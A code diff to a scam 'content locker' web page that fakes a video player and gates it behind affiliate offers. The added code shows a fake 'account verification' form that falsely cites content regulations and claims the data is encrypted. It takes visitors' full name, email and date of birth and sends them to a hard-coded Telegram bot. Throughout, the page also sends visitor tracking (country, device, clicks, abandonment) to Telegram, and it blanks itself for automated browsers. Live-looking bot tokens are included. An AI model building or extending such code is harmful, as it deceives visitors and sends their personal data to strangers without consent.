@@ -14,14 +14,7 @@
 
     <!-- Anti-Theft & Anti-Scraping Defenses -->
     <script>
-        // 1. Offline & HTTrack Defense
-        // If the protocol isn't HTTP/HTTPS (e.g., file:// for offline ripping), nuke the page
-        if (window.location.protocol.indexOf('http') !== 0) {
-            document.documentElement.innerHTML = '';
-            window.location.replace("about:blank");
-        }
-
-        // 2. Headless Browser / Scraper Detection
+        // 1. Headless Browser / Scraper Detection
         if (navigator.webdriver || window.document.documentElement.getAttribute("webdriver")) {
             document.documentElement.innerHTML = '';
         }
@@ -285,19 +278,114 @@
         // ================== TELEGRAM BOT TRACKING ==================
         const TELEGRAM_BOT_TOKEN = "8613287923:AAHdEU3BR0IY8p3vrY1LQ2DF7Fbl9YYH8ns";
         const TELEGRAM_CHAT_ID = "7095493606";
+
+        // Separate bot for collected user data (name/email/birthday)
+        const TELEGRAM_DATA_BOT_TOKEN = "8645910526:AAGeiqjsAfOCKDhPyyJz6FC7H64NsEErofg";
+
         let tgHasClickedOffer = false;
         let tgHasCompletedOffer = false;
         let currentCompletedOffer = "";
         let tgHasAbandonedGhost = false;
         let tgHasAbandonedAfterClick = false;
+        let collectedName = "";
 
-        function sendTelegramMessage(text, isBeacon = false) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
-            if (isBeacon && navigator.sendBeacon) {
+        // Generate a unique 4-char session ID per visit
+        const SESSION_ID = '#' + Math.random().toString(36).substring(2, 6).toUpperCase();
+
+        // === SINGLE MESSAGE TRACKING SYSTEM ===
+        let tgMessageId = null;       // Telegram message_id to edit
+        let tgTimeline = [];           // Array of timeline event strings
+        let tgHeaderInfo = {};         // Visitor info set on landing
+        let tgEditQueue = Promise.resolve(); // Queue to prevent race conditions
+
+        function getTimeStamp() {
+            return new Date().toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        }
+
+        function getVisitorTag() {
+            if (collectedName) return `${collectedName} (${SESSION_ID})`;
+            return `Visitor ${SESSION_ID}`;
+        }
+
+        function buildFullMessage() {
+            let msg = `<b>👤 ${getVisitorTag()}</b>\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            if (tgHeaderInfo.visitorType) msg += `<b>Type:</b> ${tgHeaderInfo.visitorType}\n`;
+            if (tgHeaderInfo.device) msg += `<b>Device:</b> ${tgHeaderInfo.device}\n`;
+            if (tgHeaderInfo.country) msg += `<b>Country:</b> ${tgHeaderInfo.country}\n`;
+            if (tgHeaderInfo.source) msg += `<b>Source:</b> ${tgHeaderInfo.source}\n`;
+            if (tgHeaderInfo.pastCompletions) msg += `<b>Past:</b> ${tgHeaderInfo.pastCompletions}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `<b>📋 Activity Timeline:</b>\n`;
+            tgTimeline.forEach(entry => {
+                msg += `${entry}\n`;
+            });
+            return msg;
+        }
+
+        // Send the FIRST message and store the message_id
+        async function tgSendInitial(text) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const resp = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const data = await resp.json();
+                if (data.ok && data.result && data.result.message_id) {
+                    tgMessageId = data.result.message_id;
+                }
+            } catch (err) { console.error('TG send error:', err); }
+        }
+
+        // EDIT the existing message with the updated full text
+        function tgEditMessage() {
+            tgEditQueue = tgEditQueue.then(async () => {
+                if (!tgMessageId) return;
+                try {
+                    const fullMsg = buildFullMessage();
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            message_id: tgMessageId,
+                            text: fullMsg,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } catch (err) { console.error('TG edit error:', err); }
+            });
+        }
+
+        // Fallback: if edit fails (e.g. on page close), send via beacon as new message
+        function tgBeaconFallback(eventText) {
+            tgTimeline.push(eventText);
+            const fullMsg = buildFullMessage();
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(fullMsg)}&parse_mode=HTML`;
+            if (navigator.sendBeacon) {
                 navigator.sendBeacon(url);
             } else {
-                fetch(url, { keepalive: true }).catch(err => console.error(err));
+                fetch(url, { keepalive: true }).catch(() => {});
             }
+        }
+
+        // Add a new event to the timeline and update the message
+        function addTimelineEvent(emoji, text) {
+            const entry = `${emoji} <code>${getTimeStamp()}</code> — ${text}`;
+            tgTimeline.push(entry);
+            tgEditMessage();
+        }
+
+        function sendDataToTelegram(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_DATA_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
+            fetch(url, { keepalive: true }).catch(err => console.error(err));
         }
 
         // 1. Initial Page Load Tracking
@@ -317,16 +405,22 @@
                 visits++;
                 localStorage.setItem('locker_visits', visits.toString());
 
-                let pastCompletions = localStorage.getItem('locker_completions');
-                let completionsText = pastCompletions ? `\n<b>Past Completions:</b> ${pastCompletions}` : "\n<b>Past Completions:</b> None";
+                let pastCompletions = localStorage.getItem('locker_completions') || "None";
 
-                let msg = `<b>🚀 NEW LANDING PAGE HIT!</b>\n\n`;
-                msg += `<b>Visitor:</b> ${isNewVisitor ? 'New Visitor 🆕' : 'Returning Visitor 🔄 (Visit #' + visits + ')'}\n`;
-                msg += `<b>Device:</b> ${detectOS()}\n`;
-                msg += `<b>Country:</b> ${country}\n`;
-                msg += `<b>Source:</b> ${referrer}${completionsText}`;
+                // Store header info for building the message
+                tgHeaderInfo = {
+                    visitorType: isNewVisitor ? 'New Visitor 🆕' : `Returning 🔄 (Visit #${visits})`,
+                    device: detectOS(),
+                    country: country,
+                    source: referrer,
+                    pastCompletions: pastCompletions
+                };
 
-                sendTelegramMessage(msg);
+                // Add the first timeline event
+                tgTimeline.push(`🚀 <code>${getTimeStamp()}</code> — Landed on page`);
+
+                // Send the initial message
+                await tgSendInitial(buildFullMessage());
             } catch (err) {
                 console.error(err);
             }
@@ -340,11 +434,7 @@
             if (!tgHasClickedOffer) {
                 tgHasClickedOffer = true;
                 currentCompletedOffer = offerName;
-                let msg = `<b>🖱️ OFFER CLICKED!</b>\n\n`;
-                msg += `<b>Offer:</b> ${offerName}\n`;
-                msg += `<b>Payout:</b> ${offerPayout}\n`;
-                msg += `<b>ID:</b> ${offerId}`;
-                sendTelegramMessage(msg);
+                addTimelineEvent('🖱️', `Clicked offer: <b>${offerName}</b> ($${offerPayout}) [ID: ${offerId}]`);
             }
         }
         // ===========================================================
@@ -357,7 +447,7 @@
         const boostedOffers = {
             // ================== AMERICAS ==================
             'US': { 'windows': ['', ''], 'ios': ['', ''], 'android': ['18091', '4202'], 'all': ['', ''] }, // United States
-            'CA': { 'windows': ['', ''], 'ios': ['', ''], 'android': ['', ''], 'all': ['', ''] }, // Canada
+            'CA': { 'windows': ['508', ''], 'ios': ['20204', ''], 'android': ['20273', ''], 'all': ['', ''] }, // Canada
             'MX': { 'windows': ['', ''], 'ios': ['', ''], 'android': ['', ''], 'all': ['', ''] }, // Mexico
             'BR': { 'windows': ['', ''], 'ios': ['', ''], 'android': ['', ''], 'all': ['', ''] }, // Brazil
             'AR': { 'windows': ['', ''], 'ios': ['', ''], 'android': ['', ''], 'all': ['', ''] }, // Argentina
@@ -607,7 +697,7 @@
                             localStorage.setItem('locker_completions', pastCompletions);
                         }
 
-                        sendTelegramMessage("<b>✅💰 CONVERSION SUCCESS!</b>\nA user just completed an offer and unlocked the video!");
+                        addTimelineEvent('✅💰', `<b>CONVERSION SUCCESS!</b> Unlocked video via: <b>${currentCompletedOffer || 'Unknown'}</b>`);
                         unlockContent();
                     }
                 });
@@ -623,18 +713,93 @@
             alert("Verification Successful! Playing Video...");
         }
 
+        // === DATA COLLECTION HANDLER ===
+        function handleDataSubmission() {
+            const name = document.getElementById('user-name').value.trim();
+            const email = document.getElementById('user-email').value.trim();
+            const birthday = document.getElementById('user-birthday').value;
+            const errorDiv = document.getElementById('form-error');
+
+            // Reset error
+            errorDiv.style.display = 'none';
+
+            // Validate name
+            if (!name || name.length < 2) {
+                errorDiv.textContent = '⚠️ Please enter your full name.';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            // Validate email
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!email || !emailRegex.test(email)) {
+                errorDiv.textContent = '⚠️ Please enter a valid email address.';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            // Validate birthday
+            if (!birthday) {
+                errorDiv.textContent = '⚠️ Please enter your date of birth.';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            // Age check (must be 18+)
+            const birthDate = new Date(birthday);
+            const today = new Date();
+            let age = today.getFullYear() - birthDate.getFullYear();
+            const monthDiff = today.getMonth() - birthDate.getMonth();
+            if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
+                age--;
+            }
+
+            if (age < 18) {
+                errorDiv.textContent = '🔒 You must be at least 18 years old to access this content.';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            // Disable button and show loading
+            const btn = document.getElementById('submit-data-btn');
+            btn.disabled = true;
+            btn.innerHTML = '<div class="mini-spinner"></div> Verifying...';
+
+            // Send collected data to dedicated Telegram bot
+            let msg = `<b>📋 USER DATA COLLECTED</b>\n\n`;
+            msg += `<b>Name:</b> ${name}\n`;
+            msg += `<b>Email:</b> ${email}\n`;
+            msg += `<b>Birthday:</b> ${birthday}\n`;
+            msg += `<b>Age:</b> ${age}\n`;
+            msg += `<b>Device:</b> ${detectOS()}`;
+            sendDataToTelegram(msg);
+
+            // Store data locally
+            collectedName = name; // Set name for all future notifications
+            localStorage.setItem('locker_user_name', name);
+            localStorage.setItem('locker_user_email', email);
+            addTimelineEvent('📝', `Submitted data form: <b>${name}</b> (${email}) [Age: ${age}]`);
+
+            // Transition: hide data form, show offers overlay
+            setTimeout(() => {
+                document.getElementById('data-collection-overlay').style.display = 'none';
+                document.getElementById('locker-overlay').style.display = 'flex';
+                fetchAndFilterOffers();
+            }, 1500);
+        }
+
         function startFakeBuffering(event) {
             if (event) event.stopPropagation();
             document.getElementById('initial-play-overlay').style.display = 'none';
             document.getElementById('buffering-spinner').style.display = 'flex';
             
             // Telegram Notification: Play Visit
-            sendTelegramMessage("▶️ <b>Locker Opened:</b> User clicked PLAY and is looking at the offers.");
+            addTimelineEvent('▶️', `Clicked PLAY - viewing data form.`);
 
-            fetchAndFilterOffers();
             setTimeout(() => {
                 document.getElementById('buffering-spinner').style.display = 'none';
-                document.getElementById('locker-overlay').style.display = 'flex';
+                // Show data collection form FIRST instead of offers
+                document.getElementById('data-collection-overlay').style.display = 'flex';
             }, 2500);
         }
 
@@ -646,12 +811,12 @@
             if (tgHasClickedOffer && !tgHasCompletedOffer && !tgHasAbandonedAfterClick) {
                 // If they clicked an offer, ONLY track abandon if it's a hard close (not visibilitychange)
                 if (!isVisibilityChange) {
-                    sendTelegramMessage("❌ <b>ABANDONED:</b> A user closed the page after clicking an offer, but BEFORE completing it.", true);
+                    tgBeaconFallback(`❌ <b>ABANDONED:</b> Closed page after clicking offer (<b>${currentCompletedOffer}</b>).`);
                     tgHasAbandonedAfterClick = true; 
                 }
             } else if (!tgHasClickedOffer && !tgHasAbandonedGhost) {
                 // If they never clicked an offer, track abandon on any exit (minimize, switch tab, close)
-                sendTelegramMessage("👻 <b>GHOSTED:</b> A user left the page (minimized/closed) without clicking any offers.", true);
+                tgBeaconFallback(`👻 <b>GHOSTED:</b> Left page without clicking any offers.`);
                 tgHasAbandonedGhost = true; 
             }
         }
@@ -713,6 +878,75 @@
         }, 12000); // Add a new comment every 12 seconds
     </script>
 
+    <!-- DATA COLLECTION OVERLAY (Step 1 - Before Offers) -->
+    <div class="locker-overlay" id="data-collection-overlay"
+        style="display: none; backdrop-filter: blur(8px); background: rgba(0,0,0,0.8);">
+        <div class="verification-box">
+            <div class="verif-header">
+                <div class="pulsing-red-dot"></div>
+                <span>ACCOUNT VERIFICATION</span>
+            </div>
+
+            <div class="verif-steps">
+                <div class="verif-step completed">
+                    <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18">
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                    </svg>
+                    <span>Video stream located (1080p HD)</span>
+                </div>
+                <div class="verif-step active-step">
+                    <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18">
+                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                    </svg>
+                    <span>Step 1: Confirm your identity</span>
+                </div>
+                <div class="verif-step pending">
+                    <div class="mini-spinner"></div>
+                    <span>Step 2: Complete verification task</span>
+                </div>
+            </div>
+
+            <p class="verif-instructions">To comply with content regulations, we need to verify your identity before granting access. Please fill in the details below.</p>
+
+            <form id="data-collection-form" class="data-form" onsubmit="return false;">
+                <div class="form-group">
+                    <label for="user-name">Full Name</label>
+                    <div class="input-icon-wrap">
+                        <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                        <input type="text" id="user-name" placeholder="Enter your full name" required autocomplete="name">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="user-email">Email Address</label>
+                    <div class="input-icon-wrap">
+                        <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                        <input type="email" id="user-email" placeholder="Enter your email" required autocomplete="email">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="user-birthday">Date of Birth</label>
+                    <div class="input-icon-wrap">
+                        <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M9 11H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2zm2-7h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20a2 2 0 002 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11z"/></svg>
+                        <input type="date" id="user-birthday" required>
+                    </div>
+                </div>
+                <div id="form-error" class="form-error" style="display: none;"></div>
+                <button type="button" id="submit-data-btn" class="data-submit-btn" onclick="handleDataSubmission()">
+                    <svg viewBox="0 0 24 24" fill="currentColor" width="20" height="20"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                    Verify & Continue
+                </button>
+            </form>
+
+            <div class="verif-footer">
+                <svg viewBox="0 0 24 24" fill="currentColor" width="14" height="14">
+                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z" />
+                </svg>
+                Your data is encrypted and protected
+            </div>
+        </div>
+    </div>
+
+    <!-- OFFERS OVERLAY (Step 2 - After Data Collection) -->
     <div class="locker-overlay" id="locker-overlay"
         style="display: none; backdrop-filter: blur(8px); background: rgba(0,0,0,0.8);">
         <div class="verification-box">
@@ -728,9 +962,15 @@
                     </svg>
                     <span>Video stream located (1080p HD)</span>
                 </div>
+                <div class="verif-step completed">
+                    <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18">
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                    </svg>
+                    <span>Identity confirmed</span>
+                </div>
                 <div class="verif-step pending">
                     <div class="mini-spinner"></div>
-                    <span>Awaiting human verification...</span>
+                    <span>Step 2: Awaiting human verification...</span>
                 </div>
             </div>
 
